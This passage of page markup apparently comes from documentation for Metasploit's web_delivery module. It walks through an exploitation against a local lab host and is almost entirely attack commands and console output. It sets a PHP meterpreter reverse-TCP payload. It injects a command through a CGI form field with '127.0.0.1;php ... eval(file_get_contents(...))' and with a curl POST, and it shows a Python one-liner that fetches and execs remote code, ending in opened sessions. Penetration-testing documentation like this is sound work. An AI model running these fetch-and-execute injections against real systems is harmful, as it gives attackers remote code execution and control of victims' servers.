6z\"></path></svg></a>Exploitation</h3>\n<ol>\n<li><code class=\"language-text\">use exploit/multi/script/web_delivery</code></li>\n<li><code class=\"language-text\">set lhost 192.168.2.117</code></li>\n<li><code class=\"language-text\">set target 1</code></li>\n<li><code class=\"language-text\">set payload php/meterpreter/reverse_tcp</code></li>\n<li>\n<p><code class=\"language-text\">exploit</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Exploit running as background job.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n</ol>\n<p>[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using URL: <a href=\"http://0.0.0.0:8080/de3uw0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://0.0.0.0:8080/de3uw0</a>\n[*] Local IP: <a href=\"http://192.168.2.117:8080/de3uw0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/de3uw0</a>\n[*] Server started.\n[*] Run the following command on the target machine:\nphp -d allow<em>url</em>fopen=true -r \"eval(file<em>get</em>contents('<a href=\"http://192.168.2.117:8080/de3uw0&#x27;\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/de3uw0'</a>));\"\nmsf exploit(web_delivery) ></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Now browse to the site, and submit the form with the text `127.0.0.1;php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&#39;http://192.168.2.117:8080/de3uw0&#39;));&quot;`.  If the site seems to freeze, exploitation was most likely successful.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>[*] 192.168.2.117    web_delivery - Delivering Payload\n[*] Sending stage (33986 bytes) to 192.168.2.117\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -> 192.168.2.117:48138) at 2017-03-04 15:36:31 -0500</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">or we can exploit via curl after escaping the double quotes.  Note we use `--data-urlencode` to automatically encode for us:</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>msf exploit(web_delivery) > exploit\n[*] Exploit running as background job.</p>\n<p>[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using URL: <a href=\"http://0.0.0.0:8080/OKNzr8B59zWp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://0.0.0.0:8080/OKNzr8B59zWp</a>\n[*] Local IP: <a href=\"http://192.168.2.117:8080/OKNzr8B59zWp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/OKNzr8B59zWp</a>\n[*] Server started.\n[*] Run the following command on the target machine:\npython -c \"import urllib2; r = urllib2.urlopen('<a href=\"http://192.168.2.117:8080/OKNzr8B59zWp&#x27;\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/OKNzr8B59zWp'</a>); exec(r.read());\"\nmsf exploit(web<em>delivery) > curl -X POST <a href=\"http://127.0.0.1/cgi-bin/example.pl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://127.0.0.1/cgi-bin/example.pl</a> --data-urlencode \"ip=127.0.0.1;php -d allow</em>url<em>fopen=true -r \"eval(file</em>get<em>contents('<a href=\"http://192.168.2.117:8080/de3uw0&#x27;\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/de3uw0'</a>));\"&#x26;submitsubmit\"\n[*] exec: curl -X POST <a href=\"http://127.0.0.1/cgi-bin/example.pl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://127.0.0.1/cgi-bin/example.pl</a> --data-urlencode \"ip=127.0.0.1;php -d allow</em>url<em>fopen=true -r \"eval(file</em>get_contents('<a href=\"http://192.168.2.117:8080/de3uw0&#x27;\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.2.117:8080/de3uw0'</a>));\"&#x26;submitsubmit\"</p>\n<p>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\nDload  Upload   Total   Spent    Left  Speed\n100   490    0   329  100   161  11490   5623 --:--:-- --:--:-- --:--:-- 11344\n[*] 192.168.2.117    web_delivery - Delivering Payload\n[*] Sending stage (33986 bytes) to 192.168.2.117\n[*] Meterpreter session 3 opened (192.168.2.117:4444 -> 192.168.2.117:48144) at 2017-03-04 15:39:05 -0500\n100  1132    0   971  100   161    440     73  0:00:02  0:00:02 --:--:--   440^CInterrupt: use the 'exit' command to quit</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"></span></pre></div>"}}},"pageContext":{"id":"e5036875-2eb2-5dcf-905f-189539c1529e"}}}